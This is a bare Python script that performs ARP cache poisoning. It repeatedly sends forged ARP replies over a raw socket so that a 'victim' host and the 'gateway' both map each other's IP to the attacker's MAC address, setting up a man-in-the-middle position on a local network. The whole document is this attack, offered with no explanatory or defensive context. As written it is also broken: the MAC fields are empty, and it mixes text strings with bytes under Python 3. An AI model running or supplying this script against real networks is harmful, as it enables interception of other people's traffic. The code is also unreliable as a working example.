#!/usr/bin/python3

import socket
import binascii
import struct


s = socket.socket(socket.PF_PACKET,
                  socket.SOCK_RAW,
                  socket.ntohs(0x0800))



s.bind(("wlp3s0", socket.htons(0x800)))

#type arp protocol number
code = '\x08\x06'

#MAC addr
attacker = ''
gateway = ''
victim = ''


tovictim = victim + attacker + code
togateway = gateway + attacker + code

htype = '\x00\x01'
protype = '\x08\x00'
hsize = '\x06'
psize = '\x04'
opcode = '\x00\x02'

gateip = '192.168.0.1'
victim_ip = '192.168.0.2'

gip = socket.inet_aton(gateip)
vip = socket.inet_aton(victim_ip)

arp_victim = tovictim + htype + protype + hsize \
   + psize + opcode + attacker + gip + victim + vip
   
  
arp_gateway = togateway + htype + protype + hsize + \
  psize + opcode + attacker + vip + gateway + gip

while True:
    s.send(arp_victim)
    s.send(arp_gateway)  
    

